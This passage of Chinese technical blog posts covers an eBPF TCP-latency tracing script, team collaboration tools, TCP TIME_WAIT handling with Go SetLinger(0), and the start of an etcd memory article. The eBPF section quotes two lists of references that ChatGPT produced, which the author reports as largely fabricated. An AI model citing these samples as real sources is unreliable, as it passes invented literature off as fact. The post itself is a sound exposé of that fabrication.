    packets.update(&id, &pkt);
    return 0;
}

int on_recv(struct pt_regs *ctx, struct sock *sk)
{
    u64 id = bpf_get_current_pid_tgid();
    u32 pid = id;

    // 获取数据包的时间戳和编号
    struct packet_t *pkt = packets.lookup(&id);
    if (!pkt) {
        return 0;
    }

    // 计算传输时间
    u64 delta = bpf_ktime_get_ns() - pkt->ts;

    // 统计结果
    bpf_trace_printk("tcp_time: %llu.%llums, size: %llu\\n", 
       delta/1000, delta%1000%100, pkt->size);

    // 删除统计结果
    packets.delete(&id);

    return 0;
}
"""

# 编译 eBPF 程序
b = BPF(text=bpf_text, cflags=["-Wno-macro-redefined"])

# 注册 eBPF 程序
b.attach_kprobe(event="tcp_sendmsg", fn_name="on_send")
b.attach_kprobe(event="tcp_v4_do_rcv", fn_name="on_recv")

# 输出统计信息
print("Tracing TCP latency... Hit Ctrl-C to end.")
while True:
    try:
        (task, pid, cpu, flags, ts, msg) = b.trace_fields()
        print("%-18.9f %-16s %-6d %s" % (ts, task, pid, msg))
    except KeyboardInterrupt:
        exit()
```

上面这个程序通过捕获每个数据包的时间戳来统计传输时间。在捕获 `tcp_sendmsg` 事件时，记录数据包的发送时间；在捕获 `tcp_v4_do_rcv` 事件时，记录数据包的接收时间；最后，通过比较两个时间戳来计算传输时间。

从上面的两个程序我们可以看到，eBPF 的一个编程的基本方法，这样的在Python里向内核的某些事件挂载一段 “C语言” 的方式就是 eBPF 的编程方式。实话实说，这样的代码很不好写，而且有很多非常诡异的东西，一般人是很难驾驭的（上面的代码我也不是很容易都能写通的，把 Google 都用了个底儿掉，读了很多晦涩的文档……）好在这样的代码已经有人写了，我们不必再写了，在 [Github 上的 bcc 库下的 tools 目录](https://github.com/iovisor/bcc/tree/master/tools)有很多……

BCC（[BPF Compiler Collection](https://github.com/iovisor/bcc)）是一套开源的工具集，可以在 Linux 系统中使用 BPF（Berkeley Packet Filter）程序进行系统级性能分析和监测。BCC 包含了许多实用工具，如：

1. bcc-tools：一个包含许多常用的 BCC 工具的软件包。
2. bpftrace：一个高级语言，用于编写和执行 BPF 程序。
3. tcptop：一个实时监控和分析 TCP 流量的工具。
4. execsnoop：一个用于监控进程执行情况的工具。
5. filetop：一个实时监控和分析文件系统流量的工具。
6. trace：一个用于跟踪和分析函数调用的工具。
7. funccount：一个用于统计函数调用次数的工具。
8. opensnoop：一个用于监控文件打开操作的工具。
9. pidstat：一个用于监控进程性能的工具。
10. profile：一个用于分析系统 CPU 使用情况的工具。

下面这张图你可能见过多次了，你可以看看他可以干多少事，内核里发生什么事一览无余。

![img](https://github.com/iovisor/bcc/raw/master/images/bcc_tracing_tools_2019.png)

#### 延伸阅读

一些经典的文章和书籍关于 eBPF 包括：

- Brendan Gregg 的《[BPF Performance Tools: Linux System and Application Observability](https://book.douban.com/subject/34467459/)》一书是一个全面的指南，涵盖了 eBPF 的基础知识和实践应用。
- eBPF 的官网：https://ebpf.io/ 由 [Cilium](https://cilium.io/) 建立
- [Cilium’s BPF and XDP Reference Guide](http://docs.cilium.io/en/latest/bpf/)
- [BPF Documentation](https://www.kernel.org/doc/html/latest/bpf/index.html)
- [BPF Design Q&A](https://www.kernel.org/doc/html/latest/bpf/bpf_design_QA.html)
- 还有 Github 上的 [Awesome eBPF](https://github.com/zoidbergwill/awesome-ebpf)

#### 彩蛋

最后来到彩蛋环节。因为最近 ChatGPT 很火，于是，我想通过 ChatGPT 来帮助我书写这篇文章，一开始我让ChatGPT 帮我列提纲，并根据提纲生成文章内容，并查找相关的资料，非常之顺利，包括生成的代码，我以为我们以很快地完成这篇文章。

但是，到了代码生成的时候，我发现，ChatGPT 生成的代码的思路和方法都是对的，但是是比较老的，而且是跑不起来的，**出现了好些低级错误，如：使用了未声明的变量，没有引用完整的C语言的头文件，没有正确地初始化变量，错误地获取数据，类型没有匹配……等等**，在程序调试上，挖了很多的坑，C语言本来就不好搞，挖的很多运行时的坑很难察觉，所以，耗费了我大量的时间来排除各种各样的问题，其中有环境上的问题，还有代码上的问题，这些问题即便是通过 Google 也不容易找到解决方案，我找到的解决方案都放在文章中了，尤其是第二个示例，让我调试了3个多小时，读了很多 bcc 上的issue和相关的晦涩的手册和文档，才让程序跑通。

到了文章收关的阶段，我让ChatGPT 给我几个延伸阅读，也是很好的，但是没有给出链接，于是我只得人肉 Google 了一下，然后让我吃惊的是，**好多ChatGPT给出来的文章是根本不存在的，完全是它伪造的**。我连让它干了两次都是这样，这个让我惊掉大牙。这让我开始怀疑它之前生成的内容，于是，我不得我返回仔细Review我的文章，尤其是“介绍”、“用途”和“工作原理”这三个章节，基本都是ChatGPT生成的，在Review完后，我发现了ChatGPT 给我生造了一个叫 “无损编译器”的术语，这个术语简直了，于是我开始重写我的文章。我把一些段落重写了，有一些没有，保留下来的我都标记上了 `[1]`，大家读的时候要小心阅读。

最后，**我的结论是，ChatGPT只是一个不成熟的玩具，只能回答一些没有价值的日常聊天的问题，要说能取代Google，我觉得不可能，因为Google会基于基本的事实，而ChatGPT会基于内容生成的算法，在造假方面称得上是高手，可以列为电信诈骗的范畴了，我以后不会再使用ChatGPT生成文章内容或是作我的帮手了。StackOverflow把其ban了真是不能太赞了！**

**附件一：ChatGPT的造假载图和样本**

| [![img](photo/eBPF.ref_.1-195x300.png)](https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.1.png)点击看大图 | [![img](photo/eBPF.ref_.2-286x300.png)](https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.2.png)点击看大图 |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
|                                                              |                                                              |

**ChatGPT 生成的样本一**

- Brendan Gregg 的《BPF Performance Tools: Linux System and Application Observability》一书是一个全面的指南，涵盖了 eBPF 的基础知识和实践应用。
- Alexei Starovoitov 在 2015 年的 LPC 大会上发表的《eBPF and XDP: fast programmable datapath in the Linux kernel》一文，是一个介绍 eBPF 和 XDP（eXpress Data Path）的综述。
- 谷歌的《BPF: The Future of Linux Monitoring and Observability》一文介绍了 eBPF 的基本概念，并探讨了它对于 Linux 监控和可观察性的影响。
- 微软的《A Survey of Techniques for Hardware Acceleration of BPF》一文，介绍了 eBPF 在硬件加速方面的研究现状。
- Daniel Borkmann 的《Linux kernel networking: implementation and theory》一书涵盖了 eBPF 的实现和理论。
- Martin KaFai Lau 在 2015 年的 SOSP 大会上发表的《eBPF: a new execution environment for the Linux kernel》一文，介绍了 eBPF 在 Linux 内核中的新执行环境。
- 来自两名谷歌工程师的《eBPF: A New Frontier in Performance Analysis》一文，探讨了 eBPF 对性能分析的影响。
- 《BPF Performance Tools: Linux System and Application Observability》一书中的第三章，讨论了 eBPF 的编译器和运行时系统。
- 来自三名谷歌工程师的《eBPF: The New Solaris DTrace》一文，比较了 eBPF 和 Solaris DTrace 系统的区别。

**ChatGPT 生成的样本二**

1. eBPF 程序开发指南（https://cilium.io/doc/ebpf/ebpf-guide/）
2. eBPF 官方文档（https://www.kernel.org/doc/Documentation/networking/filter.txt）
3. Linux 内核 eBPF 介绍（https://www.ibm.com/developerworks/cn/linux/kernel/ebpf/index.html）
4. eBPF 性能优化技巧（https://www.infoq.com/cn/news/2018/08/ebpf-performance-tips/）
5. eBPF 实战经验分享（https://blog.cloudflare.com/ebpf-in-practice/）
6. eBPF 在网络安全中的应用（https://www.zdnet.com/article/ebpf-how-to-use-it-for-network-security/）
7. eBPF 实现 Linux 系统性能监控（https://www.percona.com/blog/2017/08/15/how-to-use-ebpf-to-monitor-linux-system-performance/）
8. eBPF 入门教程（https://sysdig.com/blog/ebpf-getting-started/）
9. eBPF 与 BPF 比较（https://lwn.net/Articles/724647/）
10. eBPF 提高课程（https://www.pluralsight.com/courses/ebpf-advanced）

**附件二：发明的术语：无损编译器**

| [![img](photo/fake-180x300.png)](https://coolshell.cn/wp-content/uploads/2022/12/fake.png)点击看大图 | [![img](photo/fake.term_-223x300.png)](https://coolshell.cn/wp-content/uploads/2022/12/fake.term_.png)点击看大图 |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
|                                                              |                                                              |

（全文完）

# 聊聊团队协同和协同工具

这两天跟 [Cali](https://twitter.com/CaliCastleMusic) 和 [Rather](https://twitter.com/RatherJie) 做了一个线上的 [Podcast – Ep.5 一起聊聊团队协同](https://kjsyp.fm/podcasts/43961/episodes/ep5-ft-megaease)。主要是从 IM 工具扩展开来聊了一下团队的协同和相应的工具，但是聊天不是深度思考，有一些东西我没有讲透讲好，所以，我需要把我更多更完整更结构化的想法形成文字。（注：聊天聊地比较详细，本文只是想表达我的主要想法）

目录



[国内外的企业 IM 的本质差别](https://coolshell.cn/articles/22298.html#国内外的企业_IM_的本质差别)[企业管理](https://coolshell.cn/articles/22298.html#企业管理)[企业文化](https://coolshell.cn/articles/22298.html#企业文化)[小结](https://coolshell.cn/articles/22298.html#小结)[什么是好的协同工具](https://coolshell.cn/articles/22298.html#什么是好的协同工具)[结束语](https://coolshell.cn/articles/22298.html#结束语)

#### 国内外的企业 IM 的本质差别

国内企业级在线交流工具主要有：企业微信、钉钉、飞书，国外的则是：Slack、Discord这两大IM工具，你会发现，他们有很多不一样的东西，**其中有两个最大的不同，一个是企业管理，一个是企业文化。**

##### 企业管理

**Slack/Discrod 主要是通过建 Channel ，而国内的IM则主要是拉群**。你可能会说，这不是一样的吗？其实是不一样的，很明显，Channel 的属性是相对持久的，而群的属性则是临时的，前者是可以是部门，可以是团队，可以是项目，可以是产品，可以是某种长期存在的职能（如：技术分享），而拉群则是相对来说临时起意的，有时候，同样的人群能被重复地拉出好几次，因为之前临时起意的事做完了，所以群就被人所遗忘了，后面再有事就再来。**很明显，Channel 这种方式明显是有管理的属性的，而拉群则是没有管理的**。



所以，在国内这种作坊式，野蛮粗放式的管理风格下，他们需要的就是想起一出是一出的 IM 工具，所以，拉群就是他们的工作习惯，因为没有科学的管理，所以没有章法，所以，他们不需要把工作内的信息结构化的工具。而国外则不然，国外的管理是精细化的，国外的公司还在重度使用 Email 的通讯方式，而 Email 是天生会给一个主题时行归类，而且 Email 天生不是碎片信息，所以，国外的 IM 需要跟 Email 竞争，因为像 Email 那样给邮件分类，把信息聚合在一个主题下的方式就能在 IM 上找到相关的影子。Channel 就是一个信息分类，相当于邮件分类，Slack 的 回复区和 Discord 的子区就像是把同一个主题信息时行聚合的功能。这明显是懂管理的人做的，而国内的拉群一看就是不懂管理的人干的，或者说是就是满足这些不懂管理的人的需求的。

##### 企业文化

团队协作和团队工作最大的基石是信任，如果有了信任，没有工具都会很爽，如果没有信任，什么工具都没用。信任是一种企业文化，这种文化不仅包括同级间的，还包括上下级间的。但是，因为国内的管理跟不上，所以，就导致了各种不信任的文化，而需要在这里不信任的文化中进行协同工作，国内的 IM 软件就会开发出如下在国外的 IM 中完全没有的功能：

- **监控员工**。获取员工的工作时间以及工作位置。
- **有详细的已读标注**。这样会给对方要回复的压力。
-  **发出的信息不能修改，不能删除，非常有限地可撤回**。

而国外的 IM 则是，发出的信息可以修改/删除，没有已读标准，也不会监控员工。这种时候，我总是会对工作在这种不信任文化中人感到可怜……如果大家需要靠逼迫的方式把对方拉来跟我一起协作，我们还工作个什么劲啊。

##### 小结

所以，我们可以看到，**畸形的企业管理和企业文化下，就会导致畸形的协同工具**。最令人感到悲哀的是，有好多同学还觉得国内的钉钉非常之好，殊不知，你之所以感觉好用，是因为你所在的环境是如此的不堪。你看，**人到了不同的环境就会有不同的认识，所以，找一个好一些的环境对一个人的成长有多重要**。

给一些新入行的人的建议就是，一个环境对一个人的认知会有非常大的影响，找一个好的环境是非常重要，如果不知道什么 环境是好的，那就先从不使用钉钉为工作协同软件的公司开始吧……

#### 什么是好的协同工具

我们从上面可以得到，协同的前提条件是你需要有一个基于信任的企业文化，还需要有有结构化思维的科学的管理思维。没有这两个东西，给你的团队再多的工具都不可能有真正好有协同的，大家就是装模作样罢了。

假设我们的管理和文化都没有问题，那下面我们来谈谈协同工具的事。

我个人觉得 IM 这种工具包括会议都不是一种好的协同工具，因为这些工具都无法把信息做到真正的结构化和准确化，用 IM 或是开会上的信息大多都是碎片化严重，而且没有经过深度思考或是准备的，基本都是即兴出来的东西，不靠谱的概率非常大。

找人交流和开会不是有个话题就好的，还需要一个可以讨论的“议案”。在 Amazon 里开会，会前，组织方会把要讨论的方案打印出来给大家看，这个方案是深思过的，是验证过的，是有数据和证据或是引用支撑的，会议开始后，10 -15分钟是没有人说话的，大家都在看文档，然后就开始直接讨论或发表意见，支持还是不支持，还是有条件支持……会议效率就会很高。

但是这个议案其实是可以由大家一起来完成的，所以，连打印或是开会都不需要。试想一下，使用像 Google Doc 这样的协同文档工具，把大家拉到同一个文档里直接创作，不香吗？我在前段时间，在公网上组织大家来帮我完成一个《[非常时期的囤货手册](https://docs.google.com/document/d/1-c93ax4Uog_CHTOLBKpKLNCUtZYwacGbXm8OP3Fh810)》，这篇文章的形成有数百个网友的加持，而我就是在做一个主编的工作，这种工作是 IM 工具无法完成的事。与之类似的协同工具还有大家一起写代码的 Github，大家一起做设计的 Figma……这样创作类的协同工具非常多。另外，好多这些工具都能实时展示别人的创作过程，这个简直是太爽了，你可以通过观看他人创作过程，学习到很多他人的思路和想法，这个在没有协同工具的时代是很难想像的。

好的协同工具是可以互相促进互相激励的，就像一个足球队一样，当你看到你的队友在勇敢地争抢，拼命地奔跑，你也会被感染到的。

所以，**好的协同就是能够跟一帮志同道合，有共同目标，有想法，有能力的人一起做个什么事**。**所以，在我心中我最喜欢的协同工具从来都是创作类的，不是管理类的，更不是聊天类的。**管理和聊天的协同软件会让你产生一种有产出的假象，但其实不同，这种工具无论做的有多好，都是支持性的工具，不是产出类的工具，不会提升生产力的。

另外，在创作类的协同工具上如果有一些智能小帮手，如：Github 发布的 Copilot。那简直是让人爽翻天了，所以，真正能提升生产力的工具都是在内容上帮得到你的。

#### 结束语

我其实并不喜欢今天所有的 IM 工具，因为我觉得信息不是结构化的，信息是有因果关系和上下文的，是结构化的，是多维度的，不是今天这种线性的方式，我们想像一下“脑图”或是知识图，或是 wikipedia 的网关的关联，我们可能就能想像得到一个更好的 IM 应该是什么 样的……

协同工作的想像空间实在是太大了，我觉得所有的桌面端的软件都会被协作版的重写，虽然，这种协作软件需要有网络的加持，但是协作软件的魅力和诱惑力实在的太大了，让人无法不从……

未来的企业，那些管理类的工具一定会被边缘化的，聊天类的会被打成一个通知中心，而创作类的会大放异彩，让大家直接在要干的事上进行沟通、交互和分享。

（全文完）

# 从一次经历谈 TIME_WAIT 的那些事

今天来讲一讲TCP 的 `TIME_WAIT` 的问题。这个问题尽人皆知，不过，这次遇到的是不太一样的场景，前两天也解决了，正好写篇文章，顺便把 `TIME_WAIT` 的那些事都说一说。对了，这个场景，跟我开源的探活小工具 [EaseProbe](https://github.com/megaease/easeprobe) 有关，我先说说这个场景里的问题，然后，顺着这个场景跟大家好好说一下这个事。

目录



[问题背景](https://coolshell.cn/articles/22263.html#问题背景)[为什么要 TIME_WAIT](https://coolshell.cn/articles/22263.html#为什么要_TIME_WAIT)[解决方案](https://coolshell.cn/articles/22263.html#解决方案)[Go 实际操作](https://coolshell.cn/articles/22263.html#Go_实际操作)[总结](https://coolshell.cn/articles/22263.html#总结)

#### 问题背景

先说一下背景，[EaseProbe](https://github.com/megaease/easeprobe) 是一个轻量独立的用来探活服务健康状况的小工具，支持http/tcp/shell/ssh/tls/host以及各种中间件的探活，然后，直接发送通知到主流的IM上，如：Slack/Telegram/Discrod/Email/Team，包括国内的企业微信/钉钉/飞书， 非常好用，用过的人都说好 😏。

这个探活工具在每次探活的时候，必须要从头开始建立整个网络链接，也就是说，需要从头开始进行DNS查询，建立TCP链接，然后进行通信，再关闭链接。这里，我们不会设置 TCP 的 KeepAlive 重用链接，因为探活工具除了要探活所远端的服务，还要探活整个网络的情况，所以，每次探活都需要从新来过，这样才能捕捉得到整个链路的情况。



但是，这样不断的新建链接和关闭链接，根据TCP的状态机，我们知道这会导致在探测端这边出现的 `TIME_WAIT` 的 TCP 链接，根据 TCP 协议的定义，这个 TIME_WAIT 需要等待 2倍的MSL 时间，TCP 链接都会被系统回收，在回收之前，这个链接会占用系统的资源，主要是两个资源，一个是文件描述符，这个还好，可以调整，另一个则是端口号，这个是没法调整的，因为作为发起请求的client来说，在对同一个IP上理论上你只有64K的端口号号可用（实际上系统默认只有近30K，从32,768 到 60,999 一共 60999+1-32768=28,232，你可以通过 `sysctl net.ipv4.ip_local_port_range` 查看  ），如果 `TIME_WAIT` 过多，会导致TCP无法建立链接，还会因为资源消耗太多导致整个程序甚至整个系统异常。

试想，如果我们以 10秒为周期探测10K的结点，如果TIME_WAIT的超时时间是120秒，那么在第60秒后，等着超时的 `TIME_WAIT` 我们就有可能把某个IP的端口基本用完了，就算还行，系统也有些问题。（注意：我们不仅仅只是TCP，还有HTTP协议，所以，大家不要觉得TCP的四元组只要目标地址不一样就好了，一方面，我们探的是域名，需要访问DNS服务，所以，DNS服务一般是一台服务器，还有，因为HTTPS一般是探API，而且会有网关代理API，所以链接会到同一个网关上。另外就算还可以建出站连接，但是本地程序会因为端口耗尽无法bind了。所以，现实情况并不会像理论情况那样只要四元组不冲突，端口就不会耗尽）

#### 为什么要 TIME_WAIT

那么，为什么TCP在 `TIME_WAIT` 上要等待一个2MSL的时间？``

以前写过篇比较宏观的《TCP的那些事》（[上篇](https://coolshell.cn/articles/11564.html)，[下篇](https://coolshell.cn/articles/11609.html)），这个访问在“上篇”里讲过，这里再说一次，TCP 断链接的时候，会有下面这个来来回回的过程。

我们来看主动断链接的最后一个状态 `TIME_WAIT` 后就不需要等待对端回 ack了，而是进入了超时状态。这主要是因为，在网络上，如果要知道我们发出的数据被对方收到了，那我们就需要对方发来一个确认的Ack信息，那问题来了，对方怎么知道自己发出去的ack，被收到了？难道还要再ack一下，这样ack来ack回的，那什么谁也不要玩了……是的，这就是比较著名的【两将军问题】——两个将军需要在一个不稳定的信道上达成对敌攻击时间的协商，A向B派出信鸽，我们明早8点进攻，A怎么知道B收到了信？那需要B向A派出信鸽，ack说我收到了，明早8点开干。但是，B怎么知道A会收到自己的确认信？是不是还要A再确认一下？这样无穷无尽的确认导致这个问题是没有完美解的（我们在《[分布式事务](https://coolshell.cn/articles/10910.html#Two_Generals_Problem（两将军问题）)》一文中说过这个问题，这里不再重述）

所以，我们只能等一个我们认为最大小时来解决两件个问题：

1） 为了 **防止来自一个连接的延迟段**被依赖于相同四元组（源地址、源端口、目标地址、目标端口）的稍后连接接受（被接受后，就会被马上断掉，TCP状态机紊乱）。虽然，可以通过指定 TCP 的 sequence number 一定范围内才能被接受。但这也只是让问题发生的概率低了一些，对于一个吞吐量大的的应用来说，依然能够出现问题，尤其是在具有大接收窗口的快速连接上。[RFC 1337](https://tools.ietf.org/html/rfc1337)详细解释了当 `TIME-WAIT`状态不足时会发生什么。`TIME-WAIT`以下是如果不缩短状态可以避免的示例：

![img](photo/duplicate-segment.png)由于缩短的 TIME-WAIT 状态，后续的 TCP 段已在不相关的连接中被接受（[来源](https://vincent.bernat.ch/en/blog/2014-tcp-time-wait-state-linux)）

 

2）另一个目的是确保**远端已经关闭了连接**。当最后一个*ACK* 丢失时，对端保持该`LAST-ACK`状态。在没有`TIME-WAIT`状态的情况下，可以重新打开连接，而远程端仍然认为先前的连接有效。当它收到一个*SYN*段（并且序列号匹配）时，它将以*RST*应答，因为它不期望这样的段。新连接将因错误而中止：

 

![img](photo/last-ack.png)如果远端因为最后一个 ACK 丢失而停留在 LAST-ACK 状态，则打开具有相同四元组的新连接将不起作用 （[来源](https://vincent.bernat.ch/en/blog/2014-tcp-time-wait-state-linux)）

`TIME_WAIT` 的这个超时时间的值如下所示：

- 在 macOS 上是15秒， `sysctl net.inet.tcp | grep net.inet.tcp.msl`
- 在 Linux 上是 60秒 `cat /proc/sys/net/ipv4/tcp_fin_timeout`

#### 解决方案

要解决这个问题，网上一般会有下面这些解法

- 把这个超时间调小一些，这样就可以把TCP 的端口号回收的快一些。但是也不能太小，如果流量很大的话，TIME_WAIT一样会被耗尽。
- 设置上 `tcp_tw_reuse` 。[RFC 1323](https://tools.ietf.org/html/rfc1323)提出了一组 TCP 扩展来提高高带宽路径的性能。除其他外，它定义了一个新的 TCP 选项，带有两个四字节**时间戳字段**。第一个是发送选项的 TCP 时间戳的当前值，而第二个是从远程主机接收到的最新时间戳。如果新时间戳严格大于为前一个连接记录的最新时间戳。Linux 将重用该状态下的现有 `TIME_WAIT` 连接用于**出站的链接**。也就是说，**这个参数对于入站连接是没有任何用图的。**
- 设置上 `tcp_tw_recycle` 。 这个参数同样依赖于时间戳选项，但会影响进站和出站链接。这个参数会影响NAT环境，也就是一个公司里的所有员工用一个IP地址访问外网的情况。在这种情况下，时间戳条件将禁止在这个公网IP后面的所有设备在一分钟内连接，因为它们不共享相同的时间戳时钟。毫无疑问，禁用此选项要好得多，因为它会导致 **难以检测**和**诊断**问题。（注：从 Linux 4.10 (commit [95a22caee396](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=95a22caee396cef0bb2ca8fafdd82966a49367bb) ) 开始，Linux 将为每个连接随机化时间戳偏移量，从而使该选项完全失效，无论有无NAT。它已从 Linux 4.12中完全删除）

对于服务器来说，上述的三个访问都不能解决服务器的 `TIME_WAIT` 过多的问题，真正解决问题的就是——**不作死就不会死，也就是说，服务器不要主动断链接，而设置上KeepAlive后，让客户端主动断链接，这样服务端只会有`CLOSE_WAIT`**。

但是对于用于建立出站连接的探活的 EaseProbe来说，设置上 `tcp_tw_reuse` 就可以重用 `TIME_WAIT` 了，但是这依然无法解决 `TIME_WAIT` 过多的问题。

然后，过了几天后，我忽然想起来以前在《UNIX 网络编程》上有看到过一个Socket的参数，叫 `<code>SO_LINGER`，我的编程生涯中从来没有使用过这个设置，这个参数主要是为了延尽关闭来用的，也就是说你应用调用 `close()`函数时，如果还有数据没有发送完成，则需要等一个延时时间来让数据发完，但是，如果你把延时设置为 0  时，Socket就丢弃数据，并向对方发送一个 `RST` 来终止连接，因为走的是 RST 包，所以就不会有 `TIME_WAIT` 了。

这个东西在服务器端永远不要设置，不然，你的客户端就总是看到 TCP 链接错误 “connnection reset by peer”，但是这个参数对于 EaseProbe 的客户来说，简直是太完美了，当EaseProbe 探测完后，直接 reset connection， 即不会有功能上的问题，也不会影响服务器，更不会有烦人的 `TIME_WAIT` 问题。

#### Go 实际操作

在 Golang的标准库代码里，`net.TCPConn` 有个方法 `SetLinger()`可以完成这个事，使用起来也比较简单：

```
conn, _ := net.DialTimeout("tcp", t.Host, t.Timeout())

if tcpCon, ok := conn.(*net.TCPConn); ok {
    tcpCon.SetLinger(0)
}
```

你需要把一个 `net.Conn` 转型成 `net.TCPConn`，然后就可以调用方法了。

但是对于Golang 的标准库中的 HTTP 对象来说，就有点麻烦了，Golang的 http 库把底层的这边连接对象全都包装成私有变量了，你在外面根本获取不到。这篇《[How to Set Go net/http Socket Options – setsockopt() example](https://iximiuz.com/en/posts/go-net-http-setsockopt-example/) 》中给出了下面的方法：

```
dialer := &net.Dialer{
    Control: func(network, address string, conn syscall.RawConn) error {
        var operr error
        if err := conn.Control(func(fd uintptr) {
            operr = syscall.SetsockoptInt(int(fd), unix.SOL_SOCKET, unix.TCP_QUICKACK, 1)
        }); err != nil {
            return err
        }
        return operr
    },
}

client := &http.Client{
    Transport: &http.Transport{
        DialContext: dialer.DialContext,
    },
}
```

上面这个方法非常的低层，需要直接使用setsocketopt这样的系统调用，我其实，还是想使用 `TCPConn.SetLinger(0)` 来完成这个事，即然都被封装好了，最好还是别破坏封闭性碰底层的东西。

经过Golang http包的源码阅读和摸索，我使用了下面的方法：

```
client := &http.Client{
    Timeout: h.Timeout(),
    Transport: &http.Transport{
      TLSClientConfig:   tls,
      DisableKeepAlives: true,
      DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
        d := net.Dialer{Timeout: h.Timeout()}
        conn, err := d.DialContext(ctx, network, addr)
        if err != nil {
          return nil, err
        }
        tcpConn, ok := conn.(*net.TCPConn)
        if ok {
          tcpConn.SetLinger(0)
          return tcpConn, nil
        }
        return conn, nil
      },
    },
  }
```

然后，我找来了全球 T0p 100W的域名，然后在AWS上开了一台服务器，用脚本生成了 TOP 10K 和 20K 的网站来以5s, 10s, 30s, 60s的间隔进行探活，搞到Cloudflare 的 1.1.1.1 DNS 时不时就把我拉黑，最后的测试结果也非常不错，根本 没有 TIME_WAIT 的链接，相关的测试方法、测试数据和测试报告可以参看：[Benchmark Report](https://github.com/megaease/easeprobe/blob/main/docs/Benchmark.md)

#### 总结

下面是几点总结

- `TIME_WAIT` 是一个TCP 协议完整性的手段，虽然会有一定的副作用，但是这个设计是非常关键的，最好不要妥协掉。
- 永远不要使用  `tcp_tw_recycle` ，这个参数是个巨龙，破坏力极大。
- 服务器端永远不要使用  `SO_LINGER(0)`，而且使用 `tcp_tw_reuse` 对服务端意义不大，因为它只对出站流量有用。
- 在服务端上最好不要主动断链接，设置好KeepAlive，重用链接，让客户端主动断链接。
- 在客户端上可以使用 `tcp_tw_reuse` 和 `SO_LINGER(0)`。

最后强烈推荐阅读这篇文章 – [Coping with the TCP TIME-WAIT state on busy Linux servers](https://vincent.bernat.ch/en/blog/2014-tcp-time-wait-state-linux)

（全文完）

# ETCD的内存问题

#####  [2022年05月05日 ](https://coolshell.cn/articles/22242.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [39 条评论](https://coolshell.cn/articles/22242.html#comments) 33,067 人阅读

![img](photo/etcd.png)今天跟大家分享一个etcd的内存大量占用的问题，这是前段时间在我们开源软件Easegress中遇到的问题，问题是比较简单的，但是我还想把前因后果说一下，包括，为什么要用etcd，使用etcd的用户场景，包括etcd的一些导致内存占用比较大的设计，以及最后一些建议。希望这篇文章不仅仅只是让你看到了一个简单的内存问题，还能让你有更多的收获。当然，也欢迎您关注我们的开源软件，给我们一些鼓励。

#### 为什么要用ETCD

先说一下为什么要用etcd。先从一个我们自己做的一个API网关 – Easegress（[源码](https://github.com/megaease/easegress)）说起。

[Easegress](https://github.com/megaease/easegress) 是我们开发并开源的一个API应用网关产品，这个API应用网关不仅仅只是像nginx那样用来做一个反向代理，这个网关可以做的事很多，比如：API编排、服务发现、弹力设计（熔断、限流、重试等）、认证鉴权（JWT，OAuth2，HMAC等）、同样支持各种Cloud Native的架构如：微服务架构，Service Mesh，Serverless/FaaS的集成，并可以用于扛高并发、灰度发布、全链路压力测试、物联网……等更为高级的企业级的解决方案。所以，为了达到这些目标，在2017年的时候，我们觉得在现有的网关如Nginx上是无法演进出来这样的软件的，必需重新写一个（后来其他人也应该跟我们的想法一样，所以，Lyft写了一个Envoy。只不过，Envoy是用C++写的，而我用了技术门槛更低的Go语言）

另外，Easegress最核心的设计主要有三个：



- 一是无第三方依赖的自己选主组集群的能力
- 二是像Linux管道命令行那样pipeline式的插件流式处理（支持Go/WebAssembly）
- 三是内置一个Data Store用于集群控制和数据共享。

对于任何一个分布式系统，都需要有一个强一制性的基于Paxos/Raft的可以自动选主机制，并且需要在整个集群间同步一些关键的控制/配置和相关的共享数据，以保证整个集群的行为是统一一致的。如果没有这么一个东西的话，就没有办法玩分布式系统的。这就是为什么会有像Zookeeper/etcd这样的组件出现并流行的原因。注意，Zookeeper他们主要不是给你存数据的，而是给你组集群的。

Zookeeper是一个很流行的开源软件，也被用于各大公司的生产线，包括一些开源软件，比如：Kafka。但是，这会让其它软件有一个依赖，并且在运维上带来很大的复杂度。所以，Kafka在最新的版本也通过内置了选主的算法，而抛弃了外挂zookeeper的设计。Etcd是Go语言社区这边的主力，也是kubernetes组建集群的关键组件。Easegress在一开始（5年前）使用了gossip协议同步状态（当时想的过于超前，想做广域网的集群），但是后发现这个协议太过于复杂，而且很难调试，而广域网的API Gateway也没遇到相应的场景。所以，在3年前的时候，为了稳定性的考量，我们把其换成了内嵌版本的etcd，这个设计一直沿用到今天。

Easegress会把所有的配置信息都放到etcd里，还包括一些统计监控数据，以及一些用户的自定义数据（这样用户自己的plugin不但可以在一条pipeline内，还可以在整个集群内共享数据），这对于用户进行扩展来说是非常方便的。软件代码的扩展性一直是我们追求的首要目标，尤其是开源软件更要想方设法降低技术门槛让技术易扩展，这就是为什么Google的很多开源软件都会选使用Go语言的原因，也是为什么Go正在取代C/C++的做PaaS基础组件的原因。

#### 背景问题

好了，在介绍完为什么要用etcd以后，我开始分享一个实际的问题了。我们有个用户在使用 Easegress 的时候，在Easegress内配置了上千条pipeline，导致 Easegress的内存飙升的非常厉害- 10+GB 以上，而且长时间还下不来。

用户报告的问题是——

> 在Easegress 1.4.1 上创建一个HTTP对象，1000个Pipeline，在Easegres初始化启动完成时的内存占用大概为400M，运行80分钟后2GB，运行200分钟后达到了4GB，这期间什么也没有干，对Easegress没有进行过一次请求。

一般来说，就算是API再多也不应该配置这么多的处理管道pipeline的，通常我们会使用HTTP API的前缀把一组属于一个类别的API配置在一个管道内是比较合理的，就像nginx下的location的配置，一般来说不会太多的。但是，在用户的这个场景下配置了上千个pipeline，我们也是头一次见，应该是用户想做更细粒度的控制。

经过调查后，我们发现内存使用基本全部来自etcd，我们实在没有想到，因为我们往etcd里放的数据也没有多少个key，感觉不会超过10M，但不知道为什么会占用了10GB的内存。这种时候，一般会怀疑etcd有内存泄漏，上etcd上的github上搜了一下，发现etcd在3.2和3.3的版本上都有内存泄露的问题，但都修改了，而 Easegress 使用的是3.5的最新版本，另外，一般来说内存泄漏的问题不会是这么大的，我们开始怀疑是我们哪里误用了etcd。要知道是否误用了etcd，那么只有一条路了，沉下心来，把etcd的设计好好地看一遍。

大概花了两天左右的时间看了一下etcd的设计，我发现了etcd有下面这些消耗内存的设计，老实说，还是非常昂贵的，这里分享出来，避免后面的同学再次掉坑。
